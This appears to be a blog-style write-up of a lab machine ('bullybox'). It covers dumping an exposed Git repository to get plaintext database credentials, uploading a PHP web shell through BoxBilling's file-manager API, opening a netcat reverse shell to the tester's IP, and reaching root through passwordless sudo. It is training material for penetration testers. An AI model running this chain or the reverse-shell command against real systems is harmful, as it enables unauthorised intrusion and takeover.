---
title: "PG - bullybox"
date : 2025-11-06T13:51:41+08:00
draft: false
ShowToc: true
TocOpen: true
---

# Box Info 

> Purpose: This lab demonstrates how to exploit exposed Git directories to extract sensitive configuration files, including database authentication. Using these authentications, learners log into the BoxBilling admin panel and exploit a verified RCE vulnerability (CVE-2022-XXXX). Privilege escalation was achieved because the infected user yuki was part of a sudo group, granting direct root access. This lab focuses on misconfigured Git repositories, web vulnerability exploitation, and privilege escalation via sudo.




#  Recon

```shell
mkdir /home/parallels/Desktop/box
```


###  NMAP  — Scans
A full TCP SYN scan was performed against the target host (192.168.219.27) to enumerate open services across all ports:
```shell
parallels@ubuntu-linux-2404:~/Desktop/box$ sudo nmap -vv  -sS  -g 53 -p 1-65535  -T 4  --min-rate 10000 --disable-arp-ping -o openPort.txt 192.168.219.27       
[sudo] password for parallels: 
Sorry, try again.
[sudo] password for parallels: 
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-06 10:48 HKT
Initiating Ping Scan at 10:48
Scanning 192.168.219.27 [4 ports]
Completed Ping Scan at 10:48, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:48
Completed Parallel DNS resolution of 1 host. at 10:48, 0.22s elapsed
Initiating SYN Stealth Scan at 10:48
Scanning 192.168.219.27 [65535 ports]
Discovered open port 22/tcp on 192.168.219.27
Discovered open port 80/tcp on 192.168.219.27
Increasing send delay for 192.168.219.27 from 0 to 5 due to 3476 out of 8689 dropped probes since last increase.
Increasing send delay for 192.168.219.27 from 5 to 10 due to 2655 out of 6636 dropped probes since last increase.
Warning: 192.168.219.27 giving up on port because retransmission cap hit (6).
Completed SYN Stealth Scan at 10:49, 45.28s elapsed (65535 total ports)
Nmap scan report for 192.168.219.27
Host is up, received echo-reply ttl 61 (0.39s latency).
Scanned at 2025-11-06 10:48:54 HKT for 45s
Not shown: 54754 closed tcp ports (reset), 10779 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 45.82 seconds
           Raw packets sent: 416337 (18.319MB) | Rcvd: 111927 (4.477MB)

```

Results (summary): the host responded and exposed services on TCP/22 (SSH) and TCP/80 (HTTP). Most other ports were either closed or filtered.
```shell
parallels@ubuntu-linux-2404:~/Desktop/box$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.219.27 -oN serviceScan.txt
[sudo] password for parallels: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-06 11:23 HKT
Nmap scan report for bullybox.local (192.168.219.27)
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-git: 
|   192.168.219.27:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Ready For launch 
|_http-title: Client Area 
| http-robots.txt: 8 disallowed entries 
| /boxbilling/bb-data/ /bb-data/ /bb-library/ 
|_/bb-locale/ /bb-modules/ /bb-uploads/ /bb-vendor/ /install/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
#### Web to yuki


A request to the HTTP root redirected to `http://bullybox.local/`. The tester added an `/etc/hosts` entry to resolve this virtual host locally:
 ```
parallels@ubuntu-linux-2404:~/Desktop/box$ curl http://192.168.219.27
<script>
    window.location.href = "http://bullybox.local/"
</script>

```

```
parallels@ubuntu-linux-2404:~/Desktop/box$ sudo vim /etc/hosts
192.168.219.27    bullybox.local
```

Using `git-dumper`, the tester retrieved the exposed Git repository contents:
```
parallels@ubuntu-linux-2404:~/Desktop/box$ uv pip install git-dumper 
Using Python 3.12.3 environment at: /home/parallels/Desktop/.venv
Resolved 15 packages in 2.27s
Prepared 3 packages in 272ms
Installed 15 packages in 14ms
 + beautifulsoup4==4.14.2
 + certifi==2025.10.5
 + cffi==2.0.0
 + charset-normalizer==3.4.4
 + cryptography==46.0.3
 + dulwich==0.24.8
 + git-dumper==1.0.8
 + idna==3.11
 + pycparser==2.23
 + pysocks==1.7.1
 + requests==2.32.5
 + requests-pkcs12==1.27
 + soupsieve==2.8
 + typing-extensions==4.15.0
 + urllib3==2.5.0
```

From the repository dump, a configuration file `bb-config.php` was identified containing application settings and plaintext database credentials:
```shell
parallels@ubuntu-linux-2404:~/Desktop/box$ uv run git-dumper http://bullybox.local/.git/ .
Warning: Destination '.' is not empty
[-] Testing http://bullybox.local/.git/HEAD [200]
[-] Testing http://bullybox.local/.git/ [403]
[-] Fetching common files
[-] Fetching http://bullybox.local/.git/COMMIT_EDITMSG [200]
[-] Fetching http://bullybox.local/.git/description [200]
[-] Fetching http://bullybox.local/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://bullybox.local/.git/hooks/commit-msg.sample [200]
[-] Fetching http://bullybox.local/.gitignore [404]
[-] Fetching http://bullybox.local/.git/hooks/post-update.sample [200]
[-] Fetching http://bullybox.local/.git/hooks/pre-applypatch.sample [200]
[-] http://bullybox.local/.gitignore responded with status code 404
[-] Fetching http://bullybox.local/.git/hooks/post-commit.sample [404]
[-] http://bullybox.local/.git/hooks/post-commit.sample responded with status code 404

```

```
parallels@ubuntu-linux-2404:~/Desktop/box$ cat bb-config.php 
<?php
return array (
  'debug' => false,
  'salt' => 'b94ff361990c5a8a37486ffe13fabc96',
  'url' => 'http://bullybox.local/',
  'admin_area_prefix' => '/bb-admin',
  'sef_urls' => true,
  'timezone' => 'UTC',
  'locale' => 'en_US',
  'locale_date_format' => '%A, %d %B %G',
  'locale_time_format' => ' %T',
  'path_data' => '/var/www/bullybox/bb-data',
  'path_logs' => '/var/www/bullybox/bb-data/log/application.log',
  'log_to_db' => true,
  'db' =>
  array (
    'type' => 'mysql',
    'host' => 'localhost',
    'name' => 'boxbilling',
    'user' => 'admin',
    'password' => 'Playing-Unstylish7-Provided',
  ),
  'twig' =>
  array (
    'debug' => true,
    'auto_reload' => true,
    'cache' => '/var/www/bullybox/bb-data/cache',
  ),
  'api' =>
  array (
    'require_referrer_header' => false,
    'allowed_ips' =>
    array (
    ),
    'rate_span' => 3600,
    'rate_limit' => 1000,
  ),
);
```



---

#### as yuki 

The tester identified the target application as BoxBilling (confirmed via icon / source and repository lookup). A known BoxBilling file-manager vulnerability (RCE via unrestricted file write) was used to upload a PHP web shell. The exploit flow used authenticated API calls to `/api/admin/Filemanager/save_file` while presenting a valid admin session cookie (acquired via the recovered credentials or admin access):

```
POST /index.php?_url=/api/admin/Filemanager/save_file HTTP/1.1
Host: bullybox.local
Content-Length: 56
Accept: application/json, text/javascript, */*; q=0.01
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)(KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=p3db3fgrgqttq9neq1iph01uei
Connection: close

order_id=1&path=ax.php&data=php_payload 

```


```
POST /index.php?_url=/api/admin/Filemanager/save_file HTTP/1.1
Host: bullybox.local
Content-Length: 56
Accept: application/json, text/javascript, */*; q=0.01
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)(KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=3nrf9i4mv28o5anva77ltq042d
Connection: close

order_id=1&path=revshell.php&data=php_payload

```

Accessing the uploaded web shell confirmed remote command execution:
```shell
parallels@ubuntu-linux-2404:~/Desktop/box$ curl http://bullybox.local/revshell.php?cmd=id
uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
```
 
The tester escalated the shell to an interactive callback using `nc`:
```
parallels@ubuntu-linux-2404:~/Desktop/box$ sudo nc -lvnp 80
[sudo] password for parallels: 
Listening on 0.0.0.0 80
Connection received on 192.168.219.27 37682



ls
CHANGELOG.md
LICENSE
README.md
ax.php
bb-config-sample.php
```

```
parallels@ubuntu-linux-2404:~/Desktop/box$ curl http://bullybox.local/revshell.php?cmd=busybox%20nc%20192.168.45.182%2080%20-e%20sh
```

```
yuki@bullybox:/var/www/bullybox$ whoami 
yuki
```



## Linux privilege escalation

 yuki may run the following commands on bullybox: ,so we can get the root 
 A sudo policy enumeration revealed that `yuki` has full sudo privileges:
```
yuki@bullybox:/home$  sudo -l 
Matching Defaults entries for yuki on bullybox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User yuki may run the following commands on bullybox:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```
Because `yuki` can execute any command as root without a password, the tester obtained a root shell simply by invoking:
```
yuki@bullybox:/home$ sudo -u root bash 
```


```
root@bullybox:/home# whoami 
root
```
# References

- BoxBilling official repository: [https://github.com/boxbilling/boxbilling](https://github.com/boxbilling/boxbilling)